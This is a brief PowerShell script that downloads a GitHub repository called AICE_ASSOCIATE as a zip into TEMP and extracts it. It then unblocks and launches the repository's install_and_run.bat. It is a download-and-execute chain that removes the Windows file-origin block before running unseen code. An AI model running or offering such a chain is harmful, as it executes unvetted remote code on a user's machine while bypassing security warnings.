$zip="$env:TEMP\AICE_ASSOCIATE.zip"
$dir="$env:TEMP\AICE_ASSOCIATE"
Invoke-WebRequest "https://github.com/gncorpseo-commits/AICE_ASSOCIATE/archive/refs/heads/main.zip" -OutFile $zip
if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }
Expand-Archive $zip -DestinationPath $env:TEMP -Force
Rename-Item "$env:TEMP\AICE_ASSOCIATE-main" "AICE_ASSOCIATE" -Force
Unblock-File "$dir\setup\install_and_run.bat"
Start-Process "$dir\setup\install_and_run.bat"
